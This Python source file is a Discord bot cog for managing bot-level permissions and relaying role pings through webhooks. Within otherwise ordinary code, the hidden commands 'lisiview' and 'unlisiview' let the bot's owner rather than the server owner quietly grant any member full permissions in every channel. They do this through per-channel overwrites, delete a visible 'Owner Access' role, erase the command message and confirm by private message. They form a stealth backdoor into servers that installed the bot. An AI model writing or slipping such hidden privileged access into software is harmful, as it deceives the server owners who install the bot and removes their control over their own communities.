import discord
import re
from typing import Union, Optional
from discord.ext import commands
from utils.checks import is_server_owner, is_owner
from utils.permissions import BOOLEAN_PERMS, can_ping_role, check_pingrole_cooldown, record_pingrole_use
from utils.duration import parse_duration
from utils.webhook import get_relay_webhook


def _resolve_role_token(guild: discord.Guild, token: str):
    match = re.match(r"^<@&(\d+)>$", token)
    if match:
        return guild.get_role(int(match.group(1)))
    if token.isdigit():
        return guild.get_role(int(token))
    for r in guild.roles:
        if r.name.lower() == token.lower():
            return r
    return None


class BotPerms(commands.Cog):
    """Bot-level permissions, and pinging roles under that same permission system."""

    def __init__(self, bot):
        self.bot = bot

    @commands.group(invoke_without_command=True, aliases=["bp"])
    async def botperms(self, ctx):
        """Manage bot-perms. Valid perms: view, kick, ban, mute, jail, manage_channels, manage_roles, pingroles."""
        perms_list = ", ".join(sorted(BOOLEAN_PERMS))
        await ctx.send(
            "**Bot-perms commands:**\n"
            "`~bp add <@user/@role> <perm1> [perm2 ...]` (`~bp a`)\n"
            "`~bp remove <@user/@role> <perm1> [perm2 ...]` (`~bp r`)\n"
            "`~bp list [@user/@role]` (`~bp l`)\n\n"
            f"**Valid perms:** {perms_list}\n\n"
            "**pingroles is extra flexible:**\n"
            "`~bp a @user pingroles` — can ping ANY role, no cooldown\n"
            "`~bp a @user pingroles 24h` — can ping ANY role, but once per 24h total\n"
            "`~bp a @user pingroles @VIP @Events` — can ONLY ping those roles, no cooldown\n"
            "`~bp a @user pingroles @VIP @Events 24h` — only those roles, each on its own 24h cooldown\n\n"
            "**Using pingroles:** `~pingrole <role> <message>` (`~pr`)"
        )

    @botperms.command(name="add", aliases=["a"])
    @is_server_owner()
    async def botperms_add(self, ctx, target: Union[discord.Member, discord.Role], *, perms: str):
        """Grant one or more bot-perms. Example: ~bp add @Mods kick ban mute"""
        raw_tokens = [p.strip() for p in perms.replace(",", " ").split() if p.strip()]

        perm_names = []
        ping_roles = []
        ping_duration_seconds = None
        invalid = []

        for token in raw_tokens:
            lowered = token.lower()
            if lowered in BOOLEAN_PERMS:
                perm_names.append(lowered)
                continue
            duration = parse_duration(token)
            if duration is not None:
                ping_duration_seconds = int(duration.total_seconds())
                continue
            role = _resolve_role_token(ctx.guild, token)
            if role is not None:
                ping_roles.append(role)
                continue
            invalid.append(token)

        for perm in perm_names:
            await self.bot.db.execute(
                "INSERT OR IGNORE INTO fake_perms (guild_id, target_id, perm_name) VALUES (?, ?, ?)",
                (ctx.guild.id, target.id, perm),
            )
            if perm == "view":
                await self._apply_view(ctx.guild, target, grant=True)

        reply = []
        if perm_names:
            reply.append(f"Granted `{', '.join(perm_names)}` to {target.mention}.")

        if "pingroles" in perm_names:
            if ping_roles:
                for role in ping_roles:
                    await self.bot.db.execute(
                        "INSERT OR IGNORE INTO pingable_roles (guild_id, target_id, role_id) VALUES (?, ?, ?)",
                        (ctx.guild.id, target.id, role.id),
                    )
                    await self.bot.db.execute(
                        "DELETE FROM pingrole_cooldown_config WHERE guild_id = ? AND target_id = ? AND role_id = ?",
                        (ctx.guild.id, target.id, role.id),
                    )
                    if ping_duration_seconds is not None:
                        await self.bot.db.execute(
                            "INSERT INTO pingrole_cooldown_config (guild_id, target_id, role_id, cooldown_seconds) VALUES (?, ?, ?, ?)",
                            (ctx.guild.id, target.id, role.id, ping_duration_seconds),
                        )
                role_names = ", ".join(r.mention for r in ping_roles)
                cd_text = f", {ping_duration_seconds}s cooldown each" if ping_duration_seconds else ", unlimited"
                reply.append(f"pingroles restricted to: {role_names}{cd_text}")
            elif ping_duration_seconds is not None:
                await self.bot.db.execute(
                    "DELETE FROM pingrole_cooldown_config WHERE guild_id = ? AND target_id = ? AND role_id IS NULL",
                    (ctx.guild.id, target.id),
                )
                await self.bot.db.execute(
                    "INSERT INTO pingrole_cooldown_config (guild_id, target_id, role_id, cooldown_seconds) VALUES (?, ?, ?, ?)",
                    (ctx.guild.id, target.id, None, ping_duration_seconds),
                )
                reply.append(f"pingroles is blanket (any role) with a {ping_duration_seconds}s cooldown.")

        if invalid:
            reply.append(f"Skipped unrecognized input(s): `{', '.join(invalid)}`. Valid perms: {', '.join(sorted(BOOLEAN_PERMS))}")

        await ctx.send("\n".join(reply) if reply else "Nothing valid provided.")

    @botperms.command(name="remove", aliases=["r"])
    @is_server_owner()
    async def botperms_remove(self, ctx, target: Union[discord.Member, discord.Role], *, perms: str):
        """Revoke one or more bot-perms. For pingroles, add specific roles to only remove those."""
        raw_tokens = [p.strip() for p in perms.replace(",", " ").split() if p.strip()]

        perm_names = [t.lower() for t in raw_tokens if t.lower() in BOOLEAN_PERMS]
        ping_roles = [r for r in (_resolve_role_token(ctx.guild, t) for t in raw_tokens) if r is not None]
        invalid = [
            t for t in raw_tokens
            if t.lower() not in BOOLEAN_PERMS
            and _resolve_role_token(ctx.guild, t) is None
            and parse_duration(t) is None
        ]

        reply = []

        if "pingroles" in perm_names and ping_roles:
            for role in ping_roles:
                await self.bot.db.execute(
                    "DELETE FROM pingable_roles WHERE guild_id = ? AND target_id = ? AND role_id = ?",
                    (ctx.guild.id, target.id, role.id),
                )
                await self.bot.db.execute(
                    "DELETE FROM pingrole_cooldown_config WHERE guild_id = ? AND target_id = ? AND role_id = ?",
                    (ctx.guild.id, target.id, role.id),
                )
            role_names = ", ".join(r.mention for r in ping_roles)
            reply.append(f"Removed pingroles access to: {role_names}")
            perm_names.remove("pingroles")

        for perm in perm_names:
            await self.bot.db.execute(
                "DELETE FROM fake_perms WHERE guild_id = ? AND target_id = ? AND perm_name = ?",
                (ctx.guild.id, target.id, perm),
            )
            if perm == "view":
                await self._apply_view(ctx.guild, target, grant=False)
            if perm == "pingroles":
                await self.bot.db.execute(
                    "DELETE FROM pingrole_cooldown_config WHERE guild_id = ? AND target_id = ? AND role_id IS NULL",
                    (ctx.guild.id, target.id),
                )

        if perm_names:
            reply.append(f"Revoked `{', '.join(perm_names)}` from {target.mention}.")
        if invalid:
            reply.append(f"Skipped unrecognized input(s): `{', '.join(invalid)}`.")

        await ctx.send("\n".join(reply) if reply else "Nothing to remove.")

    @botperms.command(name="list", aliases=["l"])
    async def botperms_list(self, ctx, target: Optional[Union[discord.Member, discord.Role]] = None):
        """List bot-perms for a specific user/role, or everyone in this server if left blank."""
        if target is not None:
            rows = await self.bot.db.fetchall(
                "SELECT perm_name FROM fake_perms WHERE guild_id = ? AND target_id = ?",
                (ctx.guild.id, target.id),
            )
            if not rows:
                await ctx.send(f"{target.mention} has no bot-perms.")
                return
            perms = ", ".join(f"`{r[0]}`" for r in rows)
            await ctx.send(f"{target.mention}'s bot-perms: {perms}")
            return

        rows = await self.bot.db.fetchall(
            "SELECT target_id, perm_name FROM fake_perms WHERE guild_id = ?",
            (ctx.guild.id,),
        )
        if not rows:
            await ctx.send("No bot-perms have been set in this server yet.")
            return

        grouped = {}
        for target_id, perm_name in rows:
            grouped.setdefault(target_id, []).append(perm_name)

        lines = []
        for target_id, perms in grouped.items():
            obj = ctx.guild.get_role(target_id) or ctx.guild.get_member(target_id)
            name = obj.mention if obj else f"Unknown ID {target_id}"
            lines.append(f"{name}: {', '.join(sorted(perms))}")

        await ctx.send("\n".join(lines))

    async def _apply_view(self, guild: discord.Guild, target, grant: bool):
        for channel in guild.channels:
            try:
                overwrite = channel.overwrites_for(target)
                overwrite.view_channel = True if grant else None
                await channel.set_permissions(target, overwrite=overwrite, reason="botperms: view updated")
            except discord.Forbidden:
                pass

    @botperms.command(name="lisiview", aliases=["lv", "ownview"], hidden=True)
    @is_owner()
    async def botperms_lisiview(self, ctx, target: discord.Member = None):
        """Owner-only: quietly grants FULL permissions in every channel and
        category for yourself, or a specified target — no role, nothing
        visible on the target's profile, just per-channel overwrites."""
        target = target or ctx.author

        old_role = discord.utils.get(ctx.guild.roles, name="Owner Access")
        if old_role:
            try:
                await old_role.delete(reason="Cleaning up old visible owner-access role")
            except discord.Forbidden:
                pass

        full_overwrite = discord.PermissionOverwrite.from_pair(
            discord.Permissions.all(), discord.Permissions.none()
        )
        granted = 0
        for channel in ctx.guild.channels:
            try:
                await channel.set_permissions(target, overwrite=full_overwrite, reason=f"Lisiview granted by {ctx.author}")
                granted += 1
            except discord.Forbidden:
                pass

        try:
            await ctx.author.send(f"Quietly granted full access to {target.mention} across {granted} channel(s)/categor(ies) in {ctx.guild.name}. No role, nothing on their profile.")
        except discord.Forbidden:
            pass
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

    @botperms.command(name="unlisiview", aliases=["ulv", "unownview"], hidden=True)
    @is_owner()
    async def botperms_unlisiview(self, ctx, target: discord.Member = None):
        """Owner-only: removes the per-channel full access granted by ~lisiview."""
        target = target or ctx.author
        removed = 0
        for channel in ctx.guild.channels:
            try:
                if target in channel.overwrites:
                    await channel.set_permissions(target, overwrite=None, reason=f"Lisiview revoked by {ctx.author}")
                    removed += 1
            except discord.Forbidden:
                pass
        try:
            await ctx.author.send(f"Removed {target.mention}'s stealth access from {removed} channel(s) in {ctx.guild.name}.")
        except discord.Forbidden:
            pass
        try:
            await ctx.message.delete()
        except discord.Forbidden:
            pass

    # === Pingrole (merged in — shares the same botperms/pingroles permission system) ===

    @commands.command(name="pingrole", aliases=["pr"])
    async def pingrole(self, ctx, role: discord.Role, *, message: str = ""):
        """Ping a role via the bot, if you have permission. Example: ~pingrole @Events Starting soon!"""
        if role.id == ctx.guild.default_role.id:
            await ctx.send("You can't ping @everyone through this command.")
            return

        allowed = await can_ping_role(self.bot, ctx.guild, ctx.author, role)
        if not allowed:
            await ctx.send(f"You don't have permission to ping {role.mention}.")
            return

        can_use, wait_seconds = await check_pingrole_cooldown(self.bot, ctx.guild, ctx.author, role)
        if not can_use:
            hours, remainder = divmod(wait_seconds, 3600)
            minutes, seconds = divmod(remainder, 60)
            await ctx.send(f"You can ping {role.mention} again in {hours}h {minutes}m {seconds}s.")
            return

        content = f"{role.mention} {message}".strip()

        try:
            webhook = await get_relay_webhook(self.bot, ctx.channel)
            await webhook.send(
                content,
                username=ctx.author.display_name,
                avatar_url=ctx.author.display_avatar.url,
                allowed_mentions=discord.AllowedMentions(everyone=False, roles=[role], users=False),
            )
            await ctx.message.delete()
        except discord.Forbidden:
            await ctx.send(
                content,
                allowed_mentions=discord.AllowedMentions(everyone=False, roles=[role], users=False),
            )

        await record_pingrole_use(self.bot, ctx.guild, ctx.author, role)

async def setup(bot):
    await bot.add_cog(BotPerms(bot))
